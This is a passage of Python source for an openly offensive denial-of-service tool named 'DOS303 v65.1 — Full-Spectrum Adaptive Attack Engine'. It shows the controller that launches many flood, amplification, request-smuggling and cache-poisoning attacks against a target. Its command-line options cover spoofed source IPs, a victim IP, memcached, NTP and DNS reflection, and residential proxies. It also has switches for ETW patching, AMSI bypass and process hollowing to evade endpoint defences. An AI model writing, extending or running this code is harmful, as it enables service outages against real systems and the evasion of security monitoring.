            self.attacks.append(OperatorFatigueAttack(target, self.stop_event, self.thread_stop, self.args, original_host=original_host))

        if not self.args.no_cdntsunami and AIOQUIC_AVAILABLE and not self.is_litespeed:
            self.attacks.append(CDNTsunamiAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
        if not self.args.no_h3qpack:
            self.attacks.append(H3QPACKExpansionAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
        if not self.args.no_h3smuggle and AIOQUIC_AVAILABLE:
            self.attacks.append(H3SmugglingAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
        if not getattr(self.args, 'no_h3cachepoison', False) and AIOQUIC_AVAILABLE:
            self.attacks.append(H3CachePoisoningAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
        if not self.args.no_quicleak and self.priv_info["raw_socket_ok"] and (self.quic_probe_result or self.args.force_quic):
            ql = QUICLeakAttack(host, port, self.stop_event, self.thread_stop, self.args,
                original_host=original_host, rate_limiter=self.rate_limiter, global_sem=self.global_sem)
            ql.quic_available = self.quic_probe_result or self.args.force_quic
            ql.probe_done = True
            self.attacks.append(ql)
        if not self.args.no_graphql:
            self.attacks.append(GraphQLDeepQueryAttack(target, self.stop_event, self.thread_stop, self.args, original_host=original_host,
                origin_ip=self.origin_ip, origin_port=self.origin_port))
        if not self.args.no_grpc and H2_AVAILABLE and not skip_h2:
            self.attacks.append(GRPCCancellationChurnAttack(host, port, self.stop_event, self.thread_stop, self.args,
                original_host=original_host, global_sem=self.global_sem))
        if not self.args.no_ws:
            self.attacks.append(WebSocketAmplificationAttack(host, port, self.stop_event, self.thread_stop, self.args,
                rate_limiter=self.rate_limiter, original_host=original_host, use_ssl=use_ssl, global_sem=self.global_sem))
        if not self.args.no_quicloris:
            self.attacks.append(QUICLORISAttack(host, port, self.stop_event, self.thread_stop, self.args))

        if self.args.etw_patch: ETWPatcher.patch()
        if self.args.amsi_bypass: AMSIBypass.patch()
        if self.args.process_hollow: ProcessHollower.hollow()

        for a in self.attacks:
            if isinstance(a, Layer4AttackBase):
                a._executor = self.l4_executor

        self.start_time = time.time()
        loop = asyncio.get_running_loop()
        loop.set_exception_handler(_silent_handler)
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self._stop()))
            except NotImplementedError: pass

        if self.net_health:
            self.net_health.activate()

        self._monitor_thread = threading.Thread(target=self._monitor_worker, daemon=False)
        self._monitor_thread.start()
        logger.info("Monitor thread launched (non-daemon, will join on stop)")

        tasks = [asyncio.create_task(a.attack()) for a in self.attacks]
        logger.info(f"All {len(self.attacks)} attacks started")
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, r in enumerate(results):
            if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError):
                logger.error(f"   task[{i}] exception: {type(r).__name__}: {r}")

    async def _stop(self):
        logger.warning("Stopping...")
        self.thread_stop.set()
        if self.net_monitor: self.net_monitor.stop()
        if self.net_health: self.net_health.stop()
        if self.resource_monitor: self.resource_monitor.stop()
        if self.adaptive_controller: self.adaptive_controller.stop()
        if self.health_checker: self.health_checker.stop()
        self.stop_event.set()
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=2.0)
                logger.info("Monitor thread joined")
            except Exception: pass

    async def start(self):
        try:
            await self.run()
        except KeyboardInterrupt:
            logger.warning("Stopped by user")
        except Exception as e:
            logger.error(f"Fatal: {e}")
            import traceback
            traceback.print_exc()
        finally:
            self.thread_stop.set()
            self.stop_event.set()
            if self.http_attack and hasattr(self.http_attack, "close"):
                await self.http_attack.close()
            if self.net_monitor: self.net_monitor.stop()
            if self.net_health: self.net_health.stop()
            if self.resource_monitor: self.resource_monitor.stop()
            if self.adaptive_controller: self.adaptive_controller.stop()
            if self.health_checker: self.health_checker.stop()
            if self.l4_executor:
                try: self.l4_executor.shutdown(wait=False)
                except Exception: pass
            if self._monitor_thread and self._monitor_thread.is_alive():
                try:
                    self._monitor_thread.join(timeout=2.0)
                except Exception: pass
            try: _listener.stop()
            except Exception: pass
            logger.info("DOS303 v65.1 shutdown complete")

# ============================================================================
# CLI
# ============================================================================
def parse_args():
    p = argparse.ArgumentParser(description="DOS303 v65.1 — Full-Spectrum Adaptive Attack Engine (FINAL)")
    p.add_argument("target", nargs="?")
    p.add_argument("--workers", type=int)
    p.add_argument("--connections", type=int)
    p.add_argument("--rate", type=int)
    p.add_argument("--max-workers", type=int, default=5000)
    p.add_argument("--rate-limit", type=int, default=5000)
    p.add_argument("--delay-min", type=float, default=0.0)
    p.add_argument("--delay-max", type=float, default=0.05)
    p.add_argument("--brute", action="store_true")
    p.add_argument("--game-port", type=int, default=0)
    p.add_argument("--net-min-mbps", type=float, default=0.1)
    p.add_argument("--net-max-mbps", type=float, default=500.0)
    for f in ["slowloris", "slowpost", "slowread", "socket", "h2rapid", "spca", "cont",
              "h2bomb", "hpackbomb", "prio", "smuggle", "myr", "rangeamp", "memcached",
              "ntp", "cldap", "ssdp", "dns", "chargen", "cdntsunami", "ws", "tcpamp",
              "qdcr", "quicloris", "udpslow", "proxy", "browser", "origin", "cve",
              "smurf", "fraggle", "icmpfrag", "macspoof", "tcpts", "smuggle-http",
              "cachepoison", "fatigue", "hammer", "h3qpack", "graphql", "grpc", "quicleak",
              "cfb", "rudy", "vse", "ts3", "fivem", "fivem-token", "minecraft", "mcbot", "mcpe",
              "ard", "rdp", "cps", "connection", "slp", "ldap", "qotd", "tftp", "snmp2",
              "netbios", "mdns", "portmap", "hulk", "goldeneye", "steam", "quake",
              "dnsedns0", "ripv1", "kad", "bittorrent", "h3smuggle", "pqc", "h3cachepoison",
              "land", "jumbo"]:  # v65.1
        p.add_argument(f"--no-{f}", action="store_true")
    p.add_argument("--icmp", action="store_true")
    p.add_argument("--spoof-ip", nargs="*")
    p.add_argument("--victim-ip", type=str, default=None)
    p.add_argument("--proxy-mode", choices=["none", "whitelist", "waitout"], default="waitout")
    p.add_argument("--proxy-file", type=str, default=None)
    p.add_argument("--force-h2", action="store_true")
    p.add_argument("--force-h3", action="store_true")  # v65.1
    p.add_argument("--force-quic", action="store_true")  # v65.1
    p.add_argument("--force-rangeamp", action="store_true")
    p.add_argument("--force-graphql", action="store_true")
    p.add_argument("--smurf-broadcast", type=str, default=None)
    p.add_argument("--etw-patch", action="store_true")
    p.add_argument("--amsi-bypass", action="store_true")
    p.add_argument("--process-hollow", action="store_true")
    p.add_argument("--hammer-turbo", type=int, default=40)
    p.add_argument("--hammer-headers", type=str, default=None)
    p.add_argument("--residential-provider", type=str, default=None,
                   choices=["brightdata", "oxylabs", "smartproxy", "iproyal"])
    p.add_argument("--residential-user", type=str, default=None)
    p.add_argument("--residential-pass", type=str, default=None)
    p.add_argument("--shodan-api-key", type=str, default=None)
    p.add_argument("--securitytrails-api-key", type=str, default=None)
    p.add_argument("--censys-api-id", type=str, default=None)
    p.add_argument("--censys-api-secret", type=str, default=None)
    p.add_argument("--virustotal-api-key", type=str, default=None)
    p.add_argument("--ua-count", type=int, default=0)
    p.add_argument("--ua-type", type=str, default="random",
                   choices=["random", "chrome", "firefox", "safari", "edge", "mobile"])
    p.add_argument("--ua-output", type=str, default=None)
    return p.parse_args()

async def main():
    args = parse_args()
    if args.spoof_ip is not None and len(args.spoof_ip) == 0:
        args.spoof_ip = None

    if args.ua_count > 0:
        gen = FastUAGenerator()
        start = time.monotonic()
        uas = []
        if args.ua_type == "random":
            for _ in range(args.ua_count): uas.append(gen.random())
        elif args.ua_type == "chrome":
            for _ in range(args.ua_count):
                uas.append(gen.chrome_desktop() if random.random() > 0.5 else gen.chrome_mobile())
        elif args.ua_type == "firefox":
            for _ in range(args.ua_count): uas.append(gen.firefox_desktop())
        elif args.ua_type == "safari":
            for _ in range(args.ua_count):
                uas.append(gen.safari_desktop() if random.random() > 0.5 else gen.safari_mobile())
        elif args.ua_type == "edge":
            for _ in range(args.ua_count): uas.append(gen.edge_desktop())
        elif args.ua_type == "mobile":
            for _ in range(args.ua_count):
                uas.append(gen.chrome_mobile() if random.random() > 0.5 else gen.safari_mobile())
        elapsed = time.monotonic() - start
        rate = args.ua_count / elapsed if elapsed > 0 else 0
        print(f"[v65.1] Generated {args.ua_count:,} UAs in {elapsed:.3f}s ({rate:,.0f} UA/sec)")
        if args.ua_output:
            with open(args.ua_output, "w", encoding="utf-8") as f:
                for ua in uas: f.write(ua + "\n")
            print(f"[v65.1] Written to {args.ua_output}")
        else:
            for ua in uas[:10]: print(ua)
            if len(uas) > 10: print(f"... and {len(uas) - 10:,} more")
        return

    controller = DOS303Controller(args)
    await controller.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "Exiting..." + Style.RESET_ALL)
    except Exception as e:
        import traceback
        print("\n" + Fore.RED + f"Fatal: {e}" + Style.RESET_ALL)
        traceback.print_exc()
